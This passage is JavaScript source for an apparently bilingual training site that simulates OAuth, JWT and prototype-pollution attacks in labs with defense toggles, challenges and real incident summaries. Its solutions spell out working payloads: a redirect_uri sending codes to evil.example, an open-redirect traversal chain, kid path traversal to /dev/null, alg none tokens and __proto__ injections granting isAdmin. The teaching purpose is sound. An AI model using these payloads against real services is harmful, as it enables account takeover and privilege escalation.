          if (a.err) return { request: values.u, log: [a.err], response: 'HTTP/1.1 400', ...(defended ? verdict(false, 'Only the registered callback receives codes.', '只有注册过的回调地址才能收到授权码。') : neutral('Rejected.', '被拒绝。')) };
          const f = browserFollow(a);
          return { request: values.u, log: f.log, response: f.host === SITE ? L('code delivered to the shop', '授权码送到了商店').en : `📡 evil.example: GET /cb${a.secret}`, ...(f.host !== SITE ? verdict(true, 'You received carlos’s code. Log in with it at /oauth-callback.', '你拿到了 carlos 的授权码。用它在 /oauth-callback 登录。') : neutral('Normal login.', '正常登录。')) };
        },
      },
    },
    {
      id: 'state',
      title: L('Missing state (CSRF)', '缺少 state（CSRF）'),
      summary: L('Without a state parameter, the client can’t tell whether it started the flow. An attacker can make a victim complete the attacker’s flow, linking the attacker’s social account to the victim’s profile.', '没有 state 参数，客户端就无法判断这个流程是否由它发起。攻击者可以让受害者完成攻击者的流程，把攻击者的社交账号绑定到受害者的资料上。'),
      lab: {
        fields: [{ id: 'u', label: L('Callback the victim’s browser loads', '受害者浏览器加载的回调'), default: `https://${SITE}/oauth-linking?code=ATTACKER-code-77` }],
        presets: [{ label: L('Attacker’s code', '攻击者的授权码'), values: { u: `https://${SITE}/oauth-linking?code=ATTACKER-code-77` } }],
        defense: { label: 'state', off: L('Not used', '未使用'), on: L('Bound to the session', '绑定到会话') },
        run({ values, defended }) {
          const has = /code=ATTACKER/.test(values.u);
          if (!has) return { request: values.u, log: [], response: 'HTTP/1.1 400', ...neutral('No code.', '没有授权码。') };
          if (defended) return { request: values.u, log: [L('🛡 state missing or not this session’s → rejected', '🛡 state 缺失或不属于本会话 → 拒绝')], response: 'HTTP/1.1 403', ...verdict(false, 'Only flows the user started are accepted.', '只接受用户自己发起的流程。') };
          return { request: L(`<iframe src="${values.u}"> on your page; the victim is logged in to the shop as admin`, `你页面上的 <iframe src="${values.u}">；受害者以管理员身份登录了商店`), log: [L('attacker’s social profile linked to the victim’s shop account', '攻击者的社交账号被绑定到受害者的商店账号')], response: L('Now “Log in with social” as yourself → you are in the admin’s account.', '现在用自己的社交账号“社交登录” → 你就进了管理员的账号。').en, ...verdict(true, 'Account takeover by linking.', '通过绑定实现账号接管。') };
        },
      },
    },
    {
      id: 'pkce',
      title: L('Code interception and PKCE', '授权码截获与 PKCE'),
      summary: L('If an attacker gets an authorization code (from logs, a malicious app, a Referer), they can redeem it. PKCE binds the code to a secret verifier that only the real client holds.', '如果攻击者拿到了授权码（来自日志、恶意应用、Referer），就能兑换它。PKCE 把授权码绑定到一个只有真正客户端才持有的秘密验证值上。'),
      lab: {
        fields: [{ id: 'v', label: 'code_verifier', default: '' }],
        presets: [{ label: L('Attacker (no verifier)', '攻击者（无验证值）'), values: { v: '' } }],
        defense: { label: 'PKCE', off: L('Not required', '不要求'), on: L('Required', '必需') },
        run({ values, defended }) {
          const ok = !defended || values.v === 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk';
          return { request: `POST /token\n\ngrant_type=authorization_code&code=c4rl0s-C0de&client_id=${CLIENT_ID}${values.v ? `&code_verifier=${values.v}` : ''}`, log: [defended ? L('🛡 SHA256(code_verifier) must equal the code_challenge sent earlier', '🛡 SHA256(code_verifier) 必须等于之前发送的 code_challenge') : L('code accepted from anyone', '接受任何人提交的授权码')], response: ok ? '{"access_token":"ya29.carlos-T0k"}' : '{"error":"invalid_grant"}', ...(ok ? verdict(true, 'A stolen code is as good as a password.', '偷来的授权码和密码一样好用。') : verdict(false, 'Without the verifier the code is useless.', '没有验证值，授权码毫无用处。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Log in as carlos (implicit flow)', '以 carlos 登录（隐式流程）'),
      goal: L('You completed “Log in with social” as wiener. Your browser then sent the request below. Log in to carlos’s shop account (email carlos@carlos-montoya.net).', '你以 wiener 身份完成了“社交登录”。随后你的浏览器发送了下面的请求。登录 carlos 的商店账号（邮箱 carlos@carlos-montoya.net）。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: `POST /authenticate HTTP/1.1\nHost: ${SITE}\nContent-Type: application/json\n\n{"email":"wiener@hotdog.com","username":"wiener","token":"ya29.wiener-T0k"}` }],
      run({ r }) {
        const q = parseReq(r);
        const who = q.json && q.json.token ? (q.json.email || '').split('@')[0] : null;
        return { log: [q.json ? L(`session for ${q.json.email}`, `为 ${q.json.email} 创建会话`) : L('body must be JSON', '请求体必须是 JSON')], response: who ? `HTTP/1.1 302 → /my-account?id=${who}` : 'HTTP/1.1 401', who };
      },
      check: (v, o) => o.who === 'carlos',
      hint: L('The token is valid. Which field decides whose account you get?', '令牌是有效的。是哪个字段决定了你进入谁的账号？'),
      solution: `POST /authenticate HTTP/1.1\nHost: ${SITE}\nContent-Type: application/json\n\n{"email":"carlos@carlos-montoya.net","username":"carlos","token":"ya29.wiener-T0k"}`,
      explain: L('In the implicit flow the client must still verify the token with the provider and take the identity from the provider’s answer. Better: use the authorization code flow with PKCE.', '在隐式流程中，客户端仍须向身份提供方校验令牌，并以提供方的回答作为身份。更好的做法：使用带 PKCE 的授权码流程。'),
    },
    {
      title: L('Steal the code', '偷走授权码'),
      goal: L('The OAuth server does not validate redirect_uri. Craft the authorization link that, once carlos (logged in at oauth.example) opens it, delivers his code to evil.example. client_id is shop-web.', 'OAuth 服务器不校验 redirect_uri。构造一个授权链接，让 carlos（已登录 oauth.example）打开后，把他的授权码送到 evil.example。client_id 是 shop-web。'),
      fields: [{ id: 'u', label: L('Link', '链接'), rows: 2, default: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://${SITE}/oauth-callback&response_type=code&scope=openid` }],
      run({ u }) {
        const a = authorize(u);
        if (a.err) return { log: [a.err], response: 'HTTP/1.1 400', ok: false };
        const f = browserFollow(a);
        return { log: f.log, response: f.host === 'evil.example' ? `📡 evil.example: GET${a.secret}` : `${f.host}: ${a.secret}`, ok: f.host === 'evil.example' && f.carried };
      },
      check: (v, o) => o.ok,
      hint: L('Change only redirect_uri.', '只改 redirect_uri。'),
      solution: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://evil.example/cb&response_type=code&scope=openid`,
      explain: L('The redirect_uri decides who receives the credential. Providers must match it exactly against the registered value.', 'redirect_uri 决定了谁会收到凭证。身份提供方必须将它与注册值精确匹配。'),
    },
    {
      title: L('Prefix check + open redirect', '前缀检查 + 开放重定向'),
      goal: L('Now redirect_uri must start with https://shop.example/oauth-callback. The shop has an open redirect at /post/next?path=. Get carlos’s access token to evil.example.', '现在 redirect_uri 必须以 https://shop.example/oauth-callback 开头。商店在 /post/next?path= 有一个开放重定向。把 carlos 的访问令牌弄到 evil.example。'),
      fields: [{ id: 'u', label: L('Link', '链接'), rows: 2, default: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://${SITE}/oauth-callback&response_type=code&scope=openid` }],
      run({ u }) {
        const a = authorize(u, { validate: 'prefix' });
        if (a.err) return { log: [a.err], response: 'HTTP/1.1 400', ok: false };
        const f = browserFollow(a);
        return { log: f.log, response: f.host === 'evil.example' ? (f.carried ? `📡 evil.example: ${a.secret}` : L('📡 evil.example: (no token)', '📡 evil.example：（没有令牌）').en) : `${f.host}`, ok: f.host === 'evil.example' && f.carried };
      },
      check: (v, o) => o.ok,
      hint: L('Start with the allowed prefix, climb out with /../ to /post/next?path=…, and use response_type=token: a #fragment survives redirects, a query string doesn’t.', '以允许的前缀开头，用 /../ 爬到 /post/next?path=…，并使用 response_type=token：#片段能在重定向后保留，查询字符串不能。'),
      solution: `https://oauth.example/auth?client_id=${CLIENT_ID}&redirect_uri=https://${SITE}/oauth-callback/../post/next?path=https://evil.example/exploit&response_type=token&scope=openid`,
      explain: L('Prefix checks ignore path traversal, and any open redirect on the client becomes part of the OAuth attack surface. Exact matching fixes both.', '前缀检查会忽略路径穿越，而客户端上的任何开放重定向都会成为 OAuth 攻击面的一部分。精确匹配能同时解决两者。'),
    },
  ],
  cases: [
    { year: '2014', ref: L('Covert Redirect (Wang Jing)', 'Covert Redirect（王晶）'), title: L('Open redirects meet OAuth', '开放重定向遇上 OAuth'), what: L('Researcher Wang Jing described “Covert Redirect”: many OAuth and OpenID clients registered broad redirect URIs and also had open redirects, so authorization codes or tokens could be bounced to attacker sites. It was widely reported across major providers.', '研究员王晶描述了“Covert Redirect”：许多 OAuth 和 OpenID 客户端注册了宽泛的重定向 URI，同时又存在开放重定向，因此授权码或令牌可以被弹到攻击者的网站。这一问题在各大服务商中被广泛报道。'), lesson: L('Register exact redirect URIs and remove open redirects.', '注册精确的重定向 URI，并消除开放重定向。') },
    { year: '2023', ref: L('nOAuth (Descope)', 'nOAuth（Descope）'), title: L('Trusting a mutable email claim', '信任可变的邮箱声明'), what: L('Descope reported that some apps using “Log in with Microsoft” identified users by the email claim in Azure AD tokens. Because that email could be set by the tenant admin and was not verified, an attacker could set it to a victim’s address and log in as them.', 'Descope 报告称，一些使用“通过 Microsoft 登录”的应用用 Azure AD 令牌中的邮箱声明来识别用户。由于这个邮箱可以由租户管理员设置且未经验证，攻击者可以把它设成受害者的地址，从而以受害者身份登录。'), lesson: L('Identify users by the provider’s stable subject identifier, not by email.', '用身份提供方稳定的主体标识符识别用户，而不是邮箱。') },
  ],
};

/* ====================================================== JWT */
const ORIG_H = { alg: 'HS256', typ: 'JWT', kid: 'key-1' };
const ORIG_P = { iss: SITE, sub: 'wiener', exp: 1900000000 };
const canon = (o) => JSON.stringify(o, Object.keys(o).sort());
function jwtVerify(mode, hText, pText, sig) {
  let h;
  let p;
  try {
    h = JSON.parse(hText);
    p = JSON.parse(pText);
  } catch {
    return { err: L('header or payload is not valid JSON', 'header 或 payload 不是有效的 JSON') };
  }
  const s = sig.trim();
  const unchanged = canon(h) === canon(mode === 'jwk' || mode === 'confusion' ? { ...ORIG_H, alg: 'RS256' } : ORIG_H) && canon(p) === canon(ORIG_P);
  const original = s === 'original' && unchanged;
  const log = [];
  let ok = false;
  switch (mode) {
    case 'unverified':
      ok = true;
      log.push(L('jwt.decode(token) — signature never checked', 'jwt.decode(token) — 从不检查签名'));
      break;
    case 'none':
      ok = original || (String(h.alg).toLowerCase() === 'none' && s === '');
      log.push(L(`alg = ${h.alg}`, `alg = ${h.alg}`));
      break;
    case 'weak':
      ok = original || (h.alg === 'HS256' && s === 'hmac:secret1');
      log.push(L('HMAC-SHA256 with the server secret', '用服务器密钥做 HMAC-SHA256'));
      break;
    case 'jwk':
      ok = original || (h.alg === 'RS256' && h.jwk && s === 'rsa:mine');
      log.push(h.jwk ? L('header contains a jwk → verify with that embedded key', 'header 中有 jwk → 用这个内嵌的密钥验证') : L('verify with the server’s key', '用服务器的密钥验证'));
      break;
    case 'kid': {
      const kid = String(h.kid || '');
      const nul = /^(\.\.\/)+dev\/null$/.test(kid);
      const key = nul ? '' : kid === 'key-1' ? 'S3rv3r-K3y' : null;
      log.push(L(`key = read_file("/keys/${kid}") → ${key === null ? 'not found' : JSON.stringify(key === '' ? '' : '…')}`, `密钥 = read_file("/keys/${kid}") → ${key === null ? '找不到' : JSON.stringify(key === '' ? '' : '…')}`));
      ok = original || (key !== null && h.alg === 'HS256' && s === `hmac:${key === 'S3rv3r-K3y' ? '__never__' : key}`);
      break;
    }
    case 'confusion':
      ok = original || (h.alg === 'HS256' && s === 'hmac:PUBLIC_KEY');
      log.push(L(`verify(token, PUBLIC_KEY, alg from header = ${h.alg})`, `verify(token, PUBLIC_KEY, 取自 header 的 alg = ${h.alg})`));
      break;
    default:
      ok = original;
  }
  if (s === 'original' && !unchanged && mode !== 'unverified') {
    ok = false;
    log.push(L('original signature no longer matches the modified token', '原始签名与修改后的令牌不再匹配'));
  }
  return { ok, sub: p.sub, log };
}
const JWT_FIELDS = (h, p, s) => [
  { id: 'h', label: L('Header (JSON)', 'Header（JSON）'), rows: 2, default: h },
  { id: 'p', label: L('Payload (JSON)', 'Payload（JSON）'), rows: 2, default: p },
  { id: 's', label: L('Signature: original | (empty) | hmac:<key> | rsa:mine', '签名：original | （留空）| hmac:<密钥> | rsa:mine'), default: s },
];
const H = (o) => JSON.stringify(o);
const P_ADMIN = H({ ...ORIG_P, sub: 'administrator' });
const JWT_FIX = { label: L('Verification', '验证'), off: L('As described', '如上所述'), on: L('Fixed algorithm, server-held key', '固定算法，服务器持有密钥') };
function jwtLab(mode, h, s, presets, takeaway) {
  return {
    fields: JWT_FIELDS(h, P_ADMIN, s),
    presets,
    defense: JWT_FIX,
    run({ values, defended }) {
      const r = jwtVerify(defended ? 'strict' : mode, values.h, values.p, values.s);
      if (r.err) return { request: 'GET /admin', log: [r.err], response: 'HTTP/1.1 400', ...neutral('Fix the JSON.', '修正 JSON。') };
      const admin = r.ok && r.sub === 'administrator';
      return { request: 'GET /admin\nCookie: session=<header>.<payload>.<signature>', log: defended ? [L('🛡 jwt.verify(token, KEY, { algorithms: ["HS256"] })', '🛡 jwt.verify(token, KEY, { algorithms: ["HS256"] })')] : r.log, response: admin ? ADMIN : r.ok ? 'HTTP/1.1 401 "Admin only"' : 'HTTP/1.1 401 "Invalid token"', ...(admin ? verdict(true, 'Accepted as administrator.', '被当作 administrator 接受了。') : defended ? verdict(false, 'Forged tokens are rejected.', '伪造的令牌被拒绝。') : neutral('Rejected.', '被拒绝。')) };
    },
    takeaway,
  };
}

const jwt = {
  variants: [
    {
      id: 'unverified',
      title: L('Signature never verified', '从不验证签名'),
      summary: L('The app uses decode() instead of verify(). Change sub and keep any signature.', '应用用的是 decode() 而不是 verify()。改掉 sub，签名随便。'),
      lab: jwtLab('unverified', H(ORIG_H), 'original', [{ label: 'sub: administrator', values: { h: H(ORIG_H), p: P_ADMIN, s: 'original' } }]),
    },
    {
      id: 'none',
      title: 'alg: none',
      summary: L('Some libraries accept tokens whose header says alg “none”, with an empty signature.', '有些库会接受 header 写着 alg 为“none”、签名为空的令牌。'),
      lab: jwtLab('none', H({ ...ORIG_H, alg: 'none' }), '', [
        { label: L('Modified, original sig', '已修改，原签名'), values: { h: H(ORIG_H), p: P_ADMIN, s: 'original' } },
        { label: 'alg none', values: { h: H({ ...ORIG_H, alg: 'none' }), p: P_ADMIN, s: '' } },
      ]),
    },
    {
      id: 'weak',
      title: L('Weak HMAC secret', '弱 HMAC 密钥'),
      summary: L('HS256 is only as strong as its secret. hashcat -m 16500 tries a wordlist against a captured token offline.', 'HS256 的强度只取决于它的密钥。hashcat -m 16500 可以离线地用字典去撞一个截获的令牌。'),
      lab: jwtLab('weak', H(ORIG_H), 'hmac:secret1', [
        { label: 'hmac:password', values: { h: H(ORIG_H), p: P_ADMIN, s: 'hmac:password' } },
        { label: 'hmac:secret1', values: { h: H(ORIG_H), p: P_ADMIN, s: 'hmac:secret1' } },
      ]),
    },
    {
      id: 'jwk',
      title: L('Embedded jwk header', '内嵌 jwk 头'),
      summary: L('The server verifies with whatever public key the token’s own header supplies. Sign with your key and embed it.', '服务器用令牌自己 header 中提供的公钥进行验证。用你的密钥签名，并把公钥嵌进去。'),
      lab: jwtLab('jwk', H({ ...ORIG_H, alg: 'RS256', jwk: { kty: 'RSA', e: 'AQAB', n: 'yourKey…' } }), 'rsa:mine', [
        { label: L('No jwk', '无 jwk'), values: { h: H({ ...ORIG_H, alg: 'RS256' }), p: P_ADMIN, s: 'rsa:mine' } },
        { label: '+ jwk', values: { h: H({ ...ORIG_H, alg: 'RS256', jwk: { kty: 'RSA', e: 'AQAB', n: 'yourKey…' } }), p: P_ADMIN, s: 'rsa:mine' } },
      ]),
    },
    {
      id: 'kid',
      title: L('kid path traversal', 'kid 路径穿越'),
      summary: L('The kid header names a key file. Point it at /dev/null and the key is an empty string, which you can sign with.', 'kid 头指定了一个密钥文件。把它指向 /dev/null，密钥就成了空字符串，你可以用它签名。'),
      lab: jwtLab('kid', H({ ...ORIG_H, kid: '../../../../../../dev/null' }), 'hmac:', [
        { label: 'kid: key-1', values: { h: H(ORIG_H), p: P_ADMIN, s: 'hmac:' } },
        { label: 'kid: /dev/null', values: { h: H({ ...ORIG_H, kid: '../../../../../../dev/null' }), p: P_ADMIN, s: 'hmac:' } },
      ]),
    },
    {
      id: 'confusion',
      title: L('Algorithm confusion', '算法混淆'),
      summary: L('The server verifies RS256 tokens with its public key, but takes the algorithm from the header. Switch to HS256 and the public key becomes an HMAC secret that everyone knows (PUBLIC_KEY, from /jwks.json).', '服务器用公钥验证 RS256 令牌，但算法取自 header。改成 HS256，公钥就变成了人人皆知的 HMAC 密钥（PUBLIC_KEY，来自 /jwks.json）。'),
      lab: jwtLab('confusion', H({ ...ORIG_H, alg: 'HS256' }), 'hmac:PUBLIC_KEY', [
        { label: 'RS256 + rsa:mine', values: { h: H({ ...ORIG_H, alg: 'RS256' }), p: P_ADMIN, s: 'rsa:mine' } },
        { label: 'HS256 + PUBLIC_KEY', values: { h: H({ ...ORIG_H, alg: 'HS256' }), p: P_ADMIN, s: 'hmac:PUBLIC_KEY' } },
      ], L('Always pass the expected algorithm to verify(); never let the token choose.', '调用 verify() 时始终传入预期的算法；永远不要让令牌自己选。')),
    },
  ],
  challenges: [
    {
      title: L('Nothing to verify', '没什么可验证的'),
      goal: L('The server accepts unsigned tokens. Access /admin as administrator.', '服务器接受未签名的令牌。以 administrator 身份访问 /admin。'),
      fields: JWT_FIELDS(H(ORIG_H), H(ORIG_P), 'original'),
      run({ h, p, s }) {
        const r = jwtVerify('none', h, p, s);
        return r.err ? { log: [r.err], response: 'HTTP/1.1 400' } : { log: r.log, response: r.ok ? (r.sub === 'administrator' ? ADMIN : 'HTTP/1.1 401 "Admin only"') : 'HTTP/1.1 401 "Invalid token"', ok: r.ok && r.sub === 'administrator' };
      },
      check: (v, o) => o.ok,
      hint: L('Three changes: sub, alg, and the signature (empty).', '改三处：sub、alg，以及签名（留空）。'),
      solution: `header: ${H({ ...ORIG_H, alg: 'none' })}\npayload: ${P_ADMIN}\nsignature: (empty)`,
      explain: L('“none” should never be an accepted algorithm for anything security-relevant. Libraries now reject it by default; old ones did not.', '对任何与安全相关的场景，“none”都不应是被接受的算法。现在的库默认会拒绝它，老版本则不会。'),
    },
    {
      title: L('Crack and sign', '破解并签名'),
      goal: L('The token is HS256. Its secret is one of these common JWT secrets: secret, password, 123456, jwt_secret, secret1, changeme, key, admin. Forge an administrator token.', '令牌是 HS256。其密钥是这些常见 JWT 密钥之一：secret、password、123456、jwt_secret、secret1、changeme、key、admin。伪造一个 administrator 令牌。'),
      fields: JWT_FIELDS(H(ORIG_H), H(ORIG_P), 'original'),
      run({ h, p, s }) {
        const r = jwtVerify('weak', h, p, s);
        return r.err ? { log: [r.err], response: 'HTTP/1.1 400' } : { log: r.log, response: r.ok ? (r.sub === 'administrator' ? ADMIN : 'HTTP/1.1 401 "Admin only"') : 'HTTP/1.1 401 "Invalid signature"', ok: r.ok && r.sub === 'administrator' };
      },
      check: (v, o) => o.ok,
      hint: L('Offline, hashcat would find it in seconds. Here: it’s a word followed by a digit.', '离线用 hashcat 几秒就能找到。这里：它是一个单词加一个数字。'),
      solution: `payload: ${P_ADMIN}\nsignature: hmac:secret1`,
      explain: L('A guessable HMAC secret lets anyone mint tokens. Use a long random secret (256 bits) from a secrets manager, or asymmetric keys.', '可猜测的 HMAC 密钥让任何人都能签发令牌。使用来自密钥管理服务的长随机密钥（256 位），或使用非对称密钥。'),
    },
    {
      title: L('Sign with nothing', '用“空”签名'),
      goal: L('The server loads the HMAC key from the file named by kid, relative to /keys/. Forge an administrator token.', '服务器从 kid 指定的文件（相对于 /keys/）加载 HMAC 密钥。伪造一个 administrator 令牌。'),
      fields: JWT_FIELDS(H(ORIG_H), H(ORIG_P), 'original'),
      run({ h, p, s }) {
        const r = jwtVerify('kid', h, p, s);
        return r.err ? { log: [r.err], response: 'HTTP/1.1 400' } : { log: r.log, response: r.ok ? (r.sub === 'administrator' ? ADMIN : 'HTTP/1.1 401 "Admin only"') : 'HTTP/1.1 401 "Invalid signature"', ok: r.ok && r.sub === 'administrator' };
      },
      check: (v, o) => o.ok,
      hint: L('Which file on every Linux system is guaranteed to be empty? Then sign with an empty key: hmac:', '每台 Linux 系统上哪个文件一定是空的？然后用空密钥签名：hmac:'),
      solution: `header: ${H({ ...ORIG_H, kid: '../../../../../../dev/null' })}\npayload: ${P_ADMIN}\nsignature: hmac:`,
      explain: L('kid is attacker input that reached the filesystem. Look keys up in a fixed map by ID, never by path.', 'kid 是触及文件系统的攻击者输入。按 ID 在固定映射中查找密钥，绝不按路径查找。'),
    },
  ],
  cases: [
    { year: '2015', ref: L('Tim McLean (Auth0)', 'Tim McLean（Auth0）'), title: L('Critical flaws in JWT libraries', 'JWT 库中的严重缺陷'), what: L('Tim McLean showed that several popular JWT libraries accepted alg “none” tokens without a signature, and that libraries verifying RSA tokens could be tricked into HMAC verification using the public key as the secret, letting anyone forge tokens.', 'Tim McLean 发现，多个流行的 JWT 库会接受 alg 为“none”、没有签名的令牌；而验证 RSA 令牌的库可以被诱导，用公钥作为密钥进行 HMAC 验证，从而让任何人都能伪造令牌。'), lesson: L('Let the server, not the token, decide the algorithm.', '让服务器而不是令牌来决定算法。') },
    { year: '2015', ref: 'CVE-2015-9235', title: L('jsonwebtoken (Node.js)', 'jsonwebtoken（Node.js）'), what: L('Versions of the jsonwebtoken package before 4.2.2 could be made to verify an RS256/ES256 token as HS256 with the public key, an algorithm-confusion flaw that allowed token forgery.', 'jsonwebtoken 包 4.2.2 之前的版本，可被诱导用公钥按 HS256 验证本应是 RS256/ES256 的令牌，这一算法混淆缺陷允许伪造令牌。'), lesson: L('Keep JWT libraries updated and always pin algorithms.', '保持 JWT 库更新，并始终固定算法。') },
  ],
};

/* ====================================================== Prototype pollution */
/** Turn a query string into key paths without touching any real prototype. */
function qsPaths(qs, { strip = false } = {}) {
  const out = [];
  for (const part of qs.replace(/^\?/, '').split('&')) {
    if (!part) continue;
    const i = part.indexOf('=');
    const dec = (x) => {
      try {
        return decodeURIComponent(x);
      } catch {
        return x;
      }
    };
    let k = dec(i < 0 ? part : part.slice(0, i));
    const v = dec(i < 0 ? '' : part.slice(i + 1));
    if (strip) k = k.replace('__proto__', '');
    const path = k.replace(/\]/g, '').split(/\[|\./);
    out.push({ path, v });
  }
  return out;
}
const pollutedBy = (path) => (path[0] === '__proto__' ? path.slice(1) : path[0] === 'constructor' && path[1] === 'prototype' ? path.slice(2) : null);
function clientPP(qs, opts) {
  const polluted = {};
  for (const { path, v } of qsPaths(qs, opts)) {
    const rest = pollutedBy(path);
    if (rest && rest.length === 1) polluted[rest[0]] = v;
  }
  const log = Object.keys(polluted).length ? Object.entries(polluted).map(([k, v]) => L(`Object.prototype.${k} = ${JSON.stringify(v)}`, `Object.prototype.${k} = ${JSON.stringify(v)}`)) : [L('no prototype polluted', '没有污染原型')];
  const t = polluted.transport_url;
  const html = t !== undefined ? `<script src="${t}"></script>` : '';
  const runs = t !== undefined && (/^data:[^,]*,[\s\S]*\b(alert|print)\(/i.test(t) || /^https?:\/\/evil\.example\//i.test(t));
  if (t !== undefined) log.push(L(`gadget: config.transport_url is inherited → script.src = ${t}`, `利用点：config.transport_url 是继承来的 → script.src = ${t}`));
  return { polluted, html, runs, log };
}
function walkJson(obj, polluted = {}, depth = 0) {
  if (!obj || typeof obj !== 'object' || depth > 4) return polluted;
  for (const k of Object.keys(obj)) {
    if (k === '__proto__' && obj[k] && typeof obj[k] === 'object') Object.assign(polluted, obj[k]);
    else if (k === 'constructor' && obj[k] && typeof obj[k] === 'object' && obj[k].prototype && typeof obj[k].prototype === 'object') Object.assign(polluted, obj[k].prototype);
    else walkJson(obj[k], polluted, depth + 1);
  }
  return polluted;
}
function serverPP(body) {
  let j;
  try {
    j = JSON.parse(body);
  } catch {
    return { err: true };
  }
  const polluted = walkJson(j);
  const user = { username: 'wiener', firstname: 'Peter', ...(j.address_line_1 ? { address_line_1: j.address_line_1 } : {}) };
  const isAdmin = polluted.isAdmin === true || polluted.isAdmin === 'true';
  const spaces = Number(polluted['json spaces']) || 0;
  return { polluted, isAdmin, response: JSON.stringify({ ...user, isAdmin }, null, spaces || undefined) };
}
const PP_FIX = { label: L('Merge', '合并'), off: L('Recursive merge of user keys', '递归合并用户提供的键'), on: L('Block __proto__/constructor, Object.create(null)', '屏蔽 __proto__/constructor，Object.create(null)') };

const prototypePollution = {
  variants: [
    {
      id: 'client',
      title: L('Client-side via URL', '客户端：通过 URL'),
      summary: L('A query-string parser turns ?__proto__[x]=y into Object.prototype.x = y. A gadget elsewhere reads config.transport_url, which is now inherited by every object.', '查询字符串解析器把 ?__proto__[x]=y 变成 Object.prototype.x = y。别处的一个利用点会读取 config.transport_url，而现在每个对象都继承了它。'),
      lab: {
        fields: [{ id: 'q', label: L('Query string', '查询字符串'), default: '?__proto__[transport_url]=data:,alert(1);' }],
        presets: [
          { label: '?search=x', values: { q: '?search=x' } },
          { label: '__proto__[foo]', values: { q: '?__proto__[foo]=bar' } },
          { label: 'transport_url', values: { q: '?__proto__[transport_url]=data:,alert(1);' } },
        ],
        defense: PP_FIX,
        run({ values, defended }) {
          if (defended) return { request: `https://${SITE}/${values.q}`, log: [L('🛡 keys __proto__ / constructor / prototype dropped', '🛡 丢弃 __proto__ / constructor / prototype 键')], response: '(no script added)', ...verdict(false, 'Nothing reaches the prototype.', '什么都碰不到原型。') };
          const r = clientPP(values.q);
          return { request: `https://${SITE}/${values.q}`, log: r.log, response: r.html || '(no script added)', ...(r.runs ? verdict(true, 'Pollution + gadget = DOM XSS.', '污染 + 利用点 = DOM XSS。') : Object.keys(r.polluted).length ? neutral('Polluted, but no gadget used that property.', '已污染，但没有利用点使用这个属性。') : neutral('Normal.', '正常。')) };
        },
      },
    },
    {
      id: 'constructor',
      title: L('Via constructor.prototype', '通过 constructor.prototype'),
      summary: L('If the app strips “__proto__”, obj.constructor.prototype reaches the same object. A non-recursive strip can also be beaten with __pro__proto__to__.', '如果应用会删除“__proto__”，obj.constructor.prototype 也能到达同一个对象。非递归的删除也能用 __pro__proto__to__ 绕过。'),
      lab: {
        fields: [{ id: 'q', label: L('Query string (app strips __proto__ once)', '查询字符串（应用会删除一次 __proto__）'), default: '?constructor[prototype][transport_url]=data:,alert(1);' }],
        presets: [
          { label: '__proto__', values: { q: '?__proto__[transport_url]=data:,alert(1);' } },
          { label: 'constructor.prototype', values: { q: '?constructor[prototype][transport_url]=data:,alert(1);' } },
          { label: '__pro__proto__to__', values: { q: '?__pro__proto__to__[transport_url]=data:,alert(1);' } },
        ],
        defense: PP_FIX,
        run({ values, defended }) {
          if (defended) return { request: values.q, log: [L('🛡 dangerous keys dropped at every level', '🛡 在每一层丢弃危险的键')], response: '(no script added)', ...verdict(false, 'Blocked by key, not by string replace.', '按键名屏蔽，而不是按字符串替换。') };
          const r = clientPP(values.q, { strip: true });
          return { request: values.q, log: r.log, response: r.html || '(no script added)', ...(r.runs ? verdict(true, 'Filter bypassed.', '过滤器被绕过了。') : neutral('Stripped.', '被删掉了。')) };
        },
      },
    },
    {
      id: 'server',
      title: L('Server-side privilege escalation', '服务端权限提升'),
      summary: L('The server merges your JSON into the user object. A __proto__ key in JSON is an ordinary property after JSON.parse, until an unsafe merge assigns through it.', '服务器把你的 JSON 合并进用户对象。JSON.parse 之后，__proto__ 只是一个普通属性，直到不安全的合并通过它进行赋值。'),
      lab: {
        fields: [{ id: 'b', label: L('POST /my-account/change-address body', 'POST /my-account/change-address 请求体'), rows: 2, default: '{"address_line_1":"Wiener HQ","__proto__":{"isAdmin":true}}' }],
        presets: [
          { label: L('Normal', '正常'), values: { b: '{"address_line_1":"Wiener HQ"}' } },
          { label: '__proto__.isAdmin', values: { b: '{"address_line_1":"Wiener HQ","__proto__":{"isAdmin":true}}' } },
        ],
        defense: PP_FIX,
        run({ values, defended }) {
          const r = serverPP(values.b);
          if (r.err) return { request: values.b, log: [], response: 'HTTP/1.1 400', ...neutral('Bad JSON.', 'JSON 格式错误。') };
          if (defended) return { request: values.b, log: [L('🛡 __proto__ key ignored', '🛡 忽略 __proto__ 键')], response: JSON.stringify({ username: 'wiener', isAdmin: false }), ...verdict(false, 'isAdmin can only come from the database.', 'isAdmin 只能来自数据库。') };
          return { request: `POST /my-account/change-address\n\n${values.b}`, log: Object.keys(r.polluted).map((k) => L(`Object.prototype.${k} = ${JSON.stringify(r.polluted[k])}`, `Object.prototype.${k} = ${JSON.stringify(r.polluted[k])}`)), response: r.response, ...(r.isAdmin ? verdict(true, 'Every object, including your user, now inherits isAdmin: true.', '每个对象（包括你的用户）现在都继承了 isAdmin: true。') : neutral('Normal update.', '正常更新。')) };
        },
      },
    },
    {
      id: 'detect',
      title: L('Detecting it safely', '安全地检测'),
      summary: L('Server-side pollution often has no visible output. Polluting Express’s “json spaces” option changes the indentation of every JSON response: harmless and obvious.', '服务端原型污染往往没有可见输出。污染 Express 的“json spaces”选项会改变每个 JSON 响应的缩进：无害且明显。'),
      lab: {
        fields: [{ id: 'b', label: L('Body', '请求体'), rows: 2, default: '{"address_line_1":"x","__proto__":{"json spaces":10}}' }],
        presets: [
          { label: L('Normal', '正常'), values: { b: '{"address_line_1":"x"}' } },
          { label: '"json spaces": 10', values: { b: '{"address_line_1":"x","__proto__":{"json spaces":10}}' } },
        ],
        defense: PP_FIX,
        run({ values, defended }) {
          const r = serverPP(values.b);
          if (r.err) return { request: values.b, log: [], response: 'HTTP/1.1 400', ...neutral('Bad JSON.', 'JSON 格式错误。') };
          if (defended) return { request: values.b, log: [], response: JSON.stringify({ username: 'wiener', address_line_1: 'x', isAdmin: false }), ...verdict(false, 'No change in behaviour.', '行为没有变化。') };
